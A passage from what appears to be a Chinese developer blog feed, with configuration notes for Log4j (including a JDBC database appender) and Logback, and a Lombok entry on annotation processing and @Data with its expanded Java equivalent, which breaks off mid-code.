<span class="token comment">## %r 时间 0</span>
<span class="token comment">## %t 方法名 main</span>
<span class="token comment">## %p 优先级 DEBUG/INFO/ERROR</span>
<span class="token comment">## %c 所属类的全名(包括包名)</span>
<span class="token comment">## %l 发生的位置，在某个类的某行</span>
<span class="token comment">## %m 输出代码中指定的讯息，如log(message)中的message</span>
<span class="token comment">## %n 输出一个换行符号</span>
<span class="token comment">#log4j.appender.appender1.layout.ConversionPattern=[%d{yy/MM/dd HH:mm:ss:SSS}][%C-%M] %m%n</span>
<span class="token comment">##输出到文件(这里默认为追加方式)</span>
<span class="token comment">#log4j.appender.appender2=org.apache.log4j.FileAppender</span>
<span class="token comment">##设置文件输出路径</span>
<span class="token comment">##【1】文本文件</span>
<span class="token comment">#log4j.appender.appender2.File=c:/Log4JCRM_Dao.log</span>
<span class="token comment">##设置文件输出样式</span>
<span class="token comment">#log4j.appender.appender2.layout=org.apache.log4j.PatternLayout</span>
<span class="token comment">#log4j.appender.appender2.layout.ConversionPattern=[%d{HH:mm:ss:SSS}][%C-%M] -%m%n</span>
<span class="token comment">##把日志文件写入数据库</span>
<span class="token comment">##########################日志输出到远程数据库########################################</span>
<span class="token comment">##把日志文件写入数据库</span>
<span class="token comment">##记录的日志级别</span>
<span class="token key attr-name">log4j.logger.db</span><span class="token punctuation">=</span><span class="token value attr-value">info</span>
<span class="token comment">##日志输出到数据库</span>
<span class="token key attr-name">log4j.appender.db</span> <span class="token punctuation">=</span> <span class="token value attr-value">org.apache.log4j.jdbc.JDBCAppender</span>
<span class="token comment">##缓存</span>
<span class="token key attr-name">log4j.appender.db.BufferSize</span> <span class="token punctuation">=</span> <span class="token value attr-value">0</span>
<span class="token comment">##数据库驱动</span>
<span class="token key attr-name">log4j.appender.db.Driver</span> <span class="token punctuation">=</span> <span class="token value attr-value">com.mysql.jdbc.Driver</span>
<span class="token comment">##数据url地址 ，本地可简写：jdbc:mysql:///test</span>
<span class="token key attr-name">log4j.appender.db.URL</span> <span class="token punctuation">=</span> <span class="token value attr-value">jdbc:mysql://localhost:3306/swh_hibernate4?useUnicode=true&amp;characterEncoding=utf8</span>
<span class="token comment">##数据库用户名</span>
<span class="token key attr-name">log4j.appender.db.User</span> <span class="token punctuation">=</span> <span class="token value attr-value">root</span>
<span class="token comment">##数据库密码</span>
<span class="token key attr-name">log4j.appender.db.Password</span> <span class="token punctuation">=</span> <span class="token value attr-value">root</span>
<span class="token comment">##日志布局模式</span>
<span class="token key attr-name">log4j.appender.db.layout</span> <span class="token punctuation">=</span> <span class="token value attr-value">org.apache.log4j.PatternLayout</span>
<span class="token comment">##日志插入数据库中，t_logs 表字段可自定义</span>
<span class="token key attr-name">log4j.appender.db.layout.ConversionPattern</span> <span class="token punctuation">=</span> <span class="token value attr-value">INSERT INTO t_logs(createDate, thread, priority, category,&lt;br /&gt; methodName, message) values('%d', '%t', '%-5p', '%c','%M', '[%l]-%m')</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h1>打印SQL语句</h1>
<pre class="line-numbers language-properties" data-language="properties"><code class="language-properties"><span class="token key attr-name">log4j.logger.java.sql.Connection</span><span class="token punctuation">=</span><span class="token value attr-value">DEBUG</span>
<span class="token key attr-name">log4j.logger.java.sql.Statement</span><span class="token punctuation">=</span><span class="token value attr-value">DEBUG</span>
<span class="token key attr-name">log4j.logger.java.sql.PreparedStatement</span><span class="token punctuation">=</span><span class="token value attr-value">DEBUG</span>
<span class="token key attr-name">log4j.logger.java.sql.ResultSet</span><span class="token punctuation">=</span><span class="token value attr-value">DEBUG</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
]]></content>
      <categories>
        <category>后端</category>
      </categories>
      <tags>
        <tag>Log4j</tag>
      </tags>
  </entry>
  <entry>
    <title>Logback日常使用记录</title>
    <url>/20221030/4b5ef04d.html</url>
    <content><![CDATA[<h1>Logback 配置Demo</h1>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>configuration</span><span class="token punctuation">&gt;</span></span> 
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>appender</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>consoleLog<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>ch.qos.logback.core.ConsoleAppender<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span> 
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>layout</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>ch.qos.logback.classic.PatternLayout<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span> 
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>pattern</span><span class="token punctuation">&gt;</span></span>%d - %msg%n<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>pattern</span><span class="token punctuation">&gt;</span></span> 
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>layout</span><span class="token punctuation">&gt;</span></span> 
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>appender</span><span class="token punctuation">&gt;</span></span>  
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>appender</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>fileInfoLog<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>ch.qos.logback.core.rolling.RollingFileAppender<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span> 
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>ch.qos.logback.classic.filter.LevelFilter<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span> 
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>level</span><span class="token punctuation">&gt;</span></span>ERROR<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>level</span><span class="token punctuation">&gt;</span></span>  
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>onMatch</span><span class="token punctuation">&gt;</span></span>DENY<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>onMatch</span><span class="token punctuation">&gt;</span></span>  
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>onMismatch</span><span class="token punctuation">&gt;</span></span>ACCEPT<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>onMismatch</span><span class="token punctuation">&gt;</span></span> 
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter</span><span class="token punctuation">&gt;</span></span>  
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>encoder</span><span class="token punctuation">&gt;</span></span> 
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>pattern</span><span class="token punctuation">&gt;</span></span>%d - %msg%n<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>pattern</span><span class="token punctuation">&gt;</span></span> 
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>encoder</span><span class="token punctuation">&gt;</span></span>  
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>rollingPolicy</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>ch.qos.logback.core.rolling.TimeBasedRollingPolicy<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span> 
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>fileNamePattern</span><span class="token punctuation">&gt;</span></span>C:\Users\hots_\Downloads\info.%d.log<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>fileNamePattern</span><span class="token punctuation">&gt;</span></span> 
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>rollingPolicy</span><span class="token punctuation">&gt;</span></span> 
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>appender</span><span class="token punctuation">&gt;</span></span>  
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>appender</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>fileErrorLog<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>ch.qos.logback.core.rolling.RollingFileAppender<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span> 
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>ch.qos.logback.classic.filter.ThresholdFilter<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span> 
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>level</span><span class="token punctuation">&gt;</span></span>ERROR<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>level</span><span class="token punctuation">&gt;</span></span> 
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter</span><span class="token punctuation">&gt;</span></span>  
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>encoder</span><span class="token punctuation">&gt;</span></span> 
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>pattern</span><span class="token punctuation">&gt;</span></span>%d - %msg%n<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>pattern</span><span class="token punctuation">&gt;</span></span> 
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>encoder</span><span class="token punctuation">&gt;</span></span>  
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>rollingPolicy</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>ch.qos.logback.core.rolling.TimeBasedRollingPolicy<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span> 
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>fileNamePattern</span><span class="token punctuation">&gt;</span></span>C:\Users\hots_\Downloads\error.%d.log<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>fileNamePattern</span><span class="token punctuation">&gt;</span></span> 
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>rollingPolicy</span><span class="token punctuation">&gt;</span></span> 
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>appender</span><span class="token punctuation">&gt;</span></span>  
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>root</span> <span class="token attr-name">level</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>info<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span> 
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>appender-ref</span> <span class="token attr-name">ref</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>consoleLog<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span>  
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>appender-ref</span> <span class="token attr-name">ref</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>fileInfoLog<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span>  
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>appender-ref</span> <span class="token attr-name">ref</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>fileErrorLog<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span> 
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>root</span><span class="token punctuation">&gt;</span></span> 
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>configuration</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
]]></content>
      <categories>
        <category>后端</category>
      </categories>
      <tags>
        <tag>Logback</tag>
      </tags>
  </entry>
  <entry>
    <title>Lombox日常使用记录</title>
    <url>/20221030/f1c78c8.html</url>
    <content><![CDATA[<h1>安装插件&amp;项目引入</h1>
<h2 id="Idea里需要安装lombok插件">Idea里需要安装lombok插件</h2>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/clip_image002-16383492487521.png" alt="78761c9df7b21539df3352c198d274cf.png"></p>
<h2 id="pom-xml中引用">pom.xml中引用</h2>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>    
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.projectlombok<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>    
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>lombok<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>    
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>optional</span><span class="token punctuation">&gt;</span></span>true<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>optional</span><span class="token punctuation">&gt;</span></span>  
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h1>Lombok工作原理分析</h1>
<p>会发现在Lombok使用的过程中，只需要添加相应的注解，无需再为此写任何代码。自动生成的代码到底是如何产生的呢？核心之处就是对于注解的解析上。JDK5引入了注解的同时，也提供了两种解析方式。</p>
<ol>
<li>运行时解析</li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">运行时能够解析的注解，必须将@Retention设置为RUNTIME，这样就可以通过反射拿到该注解。java.lang,reflect反射包中提供了一个接口AnnotatedElement，该接口定义了获取注解信息的几个方法，Class、Constructor、Field、Method、Package等都实现了该接口，对反射熟悉的朋友应该都会很熟悉这种解析方式。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<ol start="2">
<li>编译时解析<br>
编译时解析有两种机制，分别简单描述下：
<ul>
<li>Annotation Processing Tool<br>
apt自JDK5产生，JDK7已标记为过期，不推荐使用，JDK8中已彻底删除，自JDK6开始，可以使用Pluggable Annotation Processing API来替换它，apt被替换主要有2点原因：
<ol>
<li>api都在com.sun.mirror非标准包下</li>
<li>没有集成到javac中，需要额外运行</li>
</ol>
</li>
<li>Pluggable Annotation Processing API<br>
JSR 269自JDK6加入，作为apt的替代方案，它解决了apt的两个问题，javac在执行的时候会调用实现了该API的程序，这样我们就可以对编译器做一些增强</li>
</ul>
</li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">Lombok本质上就是一个实现了“JSR 269 API”的程序。在使用javac的过程中，它产生作用的具体流程如下：
1. javac对源代码进行分析，生成了一棵抽象语法树（AST）

2. 运行过程中调用实现了“JSR 269 API”的Lombok程序
此时Lombok就对第一步骤得到的AST进行处理，找到@Data注解所在类对应的语法树（AST），然后修改该语法树（AST），增加getter和setter方法定义的相应树节点

3. javac使用修改后的抽象语法树（AST）生成字节码文件，即给class增加新的节点（代码块）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h1>Lombok的优缺点</h1>
<pre class="line-numbers language-none"><code class="language-none">优点：
1. 能通过注解的形式自动生成构造器、getter/setter、equals、hashcode、toString等方法，提高了一定的开发效率
2. 让代码变得简洁，不用过多的去关注相应的方法
3. 属性做修改时，也简化了维护为这些属性所生成的getter/setter方法等
 
缺点：
1. 不支持多种参数构造器的重载
2. 虽然省去了手动创建getter/setter方法的麻烦，但大大降低了源代码的可读性和完整性，降低了阅读源代码的舒适度<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h1>注解</h1>
<h2 id="Slf4j">@Slf4j</h2>
<pre class="line-numbers language-none"><code class="language-none">注解在类上；为类提供一个 属性名为log 的 log4j 日志对像<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h2 id="Data">@Data</h2>
<pre class="line-numbers language-none"><code class="language-none">@Data注解在类上，会为类的所有属性自动生成setter/getter、equals、canEqual、hashCode、toString方法，如为final属性，则不会为该属性生成setter方法。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>官方实例如下</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">lombok<span class="token punctuation">.</span></span><span class="token class-name">AccessLevel</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">lombok<span class="token punctuation">.</span></span><span class="token class-name">Data</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">lombok<span class="token punctuation">.</span></span><span class="token class-name">Setter</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">lombok<span class="token punctuation">.</span></span><span class="token class-name">ToString</span></span><span class="token punctuation">;</span>

<span class="token annotation punctuation">@Data</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">DataExample</span> <span class="token punctuation">{</span>

  <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span>

  <span class="token annotation punctuation">@Setter</span><span class="token punctuation">(</span><span class="token class-name">AccessLevel</span><span class="token punctuation">.</span><span class="token constant">PACKAGE</span><span class="token punctuation">)</span>
  <span class="token keyword">private</span> <span class="token keyword">int</span> age<span class="token punctuation">;</span>

  <span class="token keyword">private</span> <span class="token keyword">double</span> score<span class="token punctuation">;</span>
  <span class="token keyword">private</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> tags<span class="token punctuation">;</span>

  <span class="token annotation punctuation">@ToString</span><span class="token punctuation">(</span>includeFieldNames <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">)</span>
  <span class="token annotation punctuation">@Data</span><span class="token punctuation">(</span>staticConstructor <span class="token operator">=</span> <span class="token string">"of"</span><span class="token punctuation">)</span>
  <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">class</span> <span class="token class-name">Exercise</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">T</span><span class="token punctuation">&gt;</span></span> <span class="token punctuation">{</span>

    <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token class-name">T</span> value<span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>如不使用Lombok，则实现如下</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Arrays</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">DataExample</span> <span class="token punctuation">{</span>
    <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token keyword">int</span> age<span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token keyword">double</span> score<span class="token punctuation">;</span>

    <span class="token keyword">private</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> tags<span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token class-name">DataExample</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">void</span> <span class="token function">setAge</span><span class="token punctuation">(</span><span class="token keyword">int</span> age<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">=</span> age<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">getAge</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>age<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setScore</span><span class="token punctuation">(</span><span class="token keyword">double</span> score<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>score <span class="token operator">=</span> score<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">double</span> <span class="token function">getScore</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>score<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">getTags</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>tags<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setTags</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> tags<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>tags <span class="token operator">=</span> tags<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token string">"DataExample("</span> <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">", "</span> <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getAge</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">", "</span> <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getScore</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">", "</span> <span class="token operator">+</span> <span class="token class-name">Arrays</span><span class="token punctuation">.</span><span class="token function">deepToString</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getTags</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">protected</span> <span class="token keyword">boolean</span> <span class="token function">canEqual</span><span class="token punctuation">(</span><span class="token class-name">Object</span> other<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> other <span class="token keyword">instanceof</span> <span class="token class-name">DataExample</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">equals</span><span class="token punctuation">(</span><span class="token class-name">Object</span> o<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>o <span class="token operator">==</span> <span class="token keyword">this</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>o <span class="token keyword">instanceof</span> <span class="token class-name">DataExample</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
        <span class="token class-name">DataExample</span> other <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">DataExample</span><span class="token punctuation">)</span> o<span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>other<span class="token punctuation">.</span><span class="token function">canEqual</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">Object</span><span class="token punctuation">)</span> <span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">?</span> other<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">:</span> <span class="token operator">!</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>other<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getAge</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> other<span class="token punctuation">.</span><span class="token function">getAge</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">Double</span><span class="token punctuation">.</span><span class="token function">compare</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getScore</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> other<span class="token punctuation">.</span><span class="token function">getScore</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token class-name">Arrays</span><span class="token punctuation">.</span><span class="token function">deepEquals</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getTags</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> other<span class="token punctuation">.</span><span class="token function">getTags</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

